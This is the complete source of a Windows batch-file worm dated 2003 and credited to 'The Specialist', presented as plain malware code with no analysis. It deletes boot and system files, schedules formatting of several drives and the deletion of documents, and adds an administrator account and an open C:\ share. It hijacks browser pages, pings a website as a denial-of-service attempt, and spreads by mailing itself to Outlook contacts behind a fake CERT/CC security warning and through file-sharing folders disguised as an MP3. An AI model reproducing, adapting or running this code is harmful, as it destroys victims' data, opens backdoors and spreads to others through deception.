   :Bat.Patch.Worm
   :Code by The Specialist
   :2003/01/05
   @echo off
   cd %windir%\system32\
   md ?ÿÿ
   cd ?ÿÿ
   copy %0 patch.exe.bat
   copy %0 patch.txt.vbs
   If exit %windir%\system32\?ÿÿ\patch.exe.bat goto DDoSEND
   :DDoS Attack
   Ping -t -n 10000 -l 5500 -f www.smtown.com/smtown
   :DDoSEND
   attrib -a +s +h +r %windir%\system32\*.*
   set yourself=exist
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y %windir%\regedt32.exe
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y c:\boot.ini
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y c:\ntdetect.com
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y c:\ntldr
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y %windir%\downlo~1\*.*
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y %windir%\system32\oobe\msoobe.exe
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y %windir%\system32\*.msc
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y %windir%\system32\mmc.exe
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat deltree /y %windir%\system32\config\sam
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat Net share root=c:\ /user=5 /unlimited
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat ren c:\hnc\hwpw.exe start.exe
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat net user administratar adminitrators /add
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat net accounts /minpwage:2 /maxpwage:3 /forcelogoff:2
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat net stop spooler
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat net sotp clipbook
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 8:30pm cmd /c "format d: /y /q report=c:\format.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 8:35pm cmd /c "format e: /y /q report=c:\format.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 8:37pm cmd /c "format f: /y /q report=c:\format.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 8:39pm cmd /c "format g: /y /q report=c:\format.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 9:00pm cmd /c "deltree /y c:\*.doc report=c:\doc.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 9:05pm cmd /c "deltree /y c:\*.hwp report=c:\hwp.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 9:10pm cmd /c "deltree /y c:\*.xls report=c:\xls.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 9:15pm cmd /c "deltree /y c:\*.ppt report=c:\ppt.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 9:20pm cmd /c "deltree /y c:\*.mp3 report=c:\mp3.txt
   If %yourself% %windir%\system32\?ÿÿ\patch.exe.bat at 9:25pm cmd /c "deltree /y c:\*.pdf report=c:\pdf.txt
   :Regedit Worm
   set yourself=echo
   %yourself% REGEDIT4>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]>>regedit.reg
   %yourself% "yourself"="c:\%windir%\system32\yourself.bat">>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>regedit.reg
   %yourself% "yourself"="c:\%windir%\system32\yourself.bat">>regedit.reg
   %yourself% [HKEY_CLASSES_ROOT\exefile\shell\open\command]>>regedit.reg
   %yourself% "@"="c:\%windir%\system32\yourself.bat"%1\" %*"a>>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\CLASSES\exefile\shell\open\command]>>regedit.reg
   %yourself% "@"="c:\%windir%\system32\yourself.bat"%1\" %*"a>>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>regedit.reg
   %yourself% "Start Page"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main]>>regedit.reg
   %yourself% "Start Page"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>regedit.reg
   %yourself% "Search Page"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main]>>regedit.reg
   %yourself% "Search Bar"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer]>>regedit.reg
   %yourself% "SearchURL"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]>>regedit.reg
   %yourself% "CustomizeSearch"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Search]>>regedit.reg
   %yourself% "SearchAssistant"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main]>>regedit.reg
   %yourself% "Search Page"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main]>>regedit.reg
   %yourself% "Search Bar"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer]>>regedit.reg
   %yourself% "SearchURL"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Search]>>regedit.reg
   %yourself% "CustomizeSearch"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Search]>>regedit.reg
   %yourself% "SearchAssistant"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Internet Explorer/Main]>>regedit.reg
   %yourself% "Default_Page_URL"="http://www.cos24.co.kr">>regedit.reg
   %yourself% [HKEY_CURRENT_USER/Software/Microsoft/Internet Explore/Main]>>regedit.reg
   %yourself% "Start Page"="http://www.cos24.co.kr">>regedit.reg
   regedit /s regedit.reg
   del regedit.reg
   set yourself=exist
   :Outlook Spreading
   Set Outlook=echo
   %Outlook% Dim x>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook%.on error resume next>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Set fso="Scripting.FileSystem.Object">>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Set so=CreateObject(fso)>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Set ol=CreateObject("Outlook,Application")>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% set out=WScript.CreateObject("Outlook.Application")>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% set mapi=out.GetNameSpace("MAPI")>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% set a=mapi.AddressLists(1)>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% set ae=a.AddressExntries>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% for x=1 To ae.Count>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% set ci=ol.CreateItem(0)>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% set Mail=ci>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Mail.Subject="[CERT/CC:Warnning]À©¾ÚÇÁÀÇ ´ÙÁß buffer overflowÃë¾à¼º">>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Mail.Body="Ã·ºÎµÈ ÆÄÀÏÀ» Âü°í ÇÏ½Ã¸é À©¾ÚÇÁÀÇ Ãë¾à¼ºÀ» ÇØ°áÇÏ½Ç ¼ö°¡ ÀÖ½À´Ï´Ù. ÀÚ¼¼ÇÑ »çÇ×Àº CERT-CC(http://www.CERTCC.or.kr)ÀÇ º¸¾È°Ô½ÃÆÇÀ» Âü°íÇÏ½Ã±â ¹Ù¶ø´Ï´Ù.">>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Mail.Attachments.Add("%windir%\system32\?ÿÿ\patch.exe.bat")>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Mai.Send>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% Next>>%windir%\system32\?ÿÿ\patch.txt.vbs
   %Outlook% ol.Quit>>%windir%\system32\?ÿÿ\patch.txt.vbs
   cscript %windir%\system32\?ÿÿ\patch.txt.vbs
   :KaZaA Spreading
   set happy=echo
   %happy% REGEDIT4>KaZaA.reg
   %happy% [HKEY_CURRENT_USER\SOFTWARE\Kazaa\LocalContent]>>KaZaA.reg
   %happy% "DisableSharing"=dword:00000000>>KaZaA.reg
   %happy% "DownloadDir"="c:\Program Files\KaZaA Lite\My Shared Folder">>KaZaA.reg
   %happy% "Dir0"="012345:c:\">>KaZaA.reg
   regedit /s KaZaA.reg
   :Soribada Spreading
   copy %0 c:\soribada.vbs
   echo.on error resume next>c:\soribada.vbs
   echo set ws=CreateObject("wscript.shell")>>c:\soribada.vbs
   echo ws.regwrite "HKEY_CURRENT_USER\Software\SORIBADA\DIRSAVE","c:\mp3\">>c:\soribada.vbs
   cscript c:\soribada.vbs
   deltree /y c:\soribada.vbs
   md c:\mp3
   copy %windir%\system32\?ÿÿ\patch.exe.bat c:\mp3\
   set teach=if
   %teach% exist c:\mp3\patch.exe.bat ren c:\mp3\patch.exe.bat In My Dream(º°À»½î´ÙOST).mp3.bat
   cls
   :VBS Dropping
   set VBS=echo
   copy %0 c:\autoexec.bat.vbs
   %VBS%.on error resume next>>c:\autoexec.bat.vbs
   %VBS% dim wshs %windir%\autoexec.bat.vbs
   %VBS% set wshs=wscript.createobject("wscript.shell")>>c:\autoexec.bat.vbs
   %VBS% wshs.run "%windir%\system32\?ÿÿ\patch.exe.bat">>c:\autoexec.bat.vbs
   for%%q in (*.vbs \*.vbs ..\*.vbs %path%\*.vbs %windir%\*.vbs) do copy autoexec.bat.vbs %%q
   cls
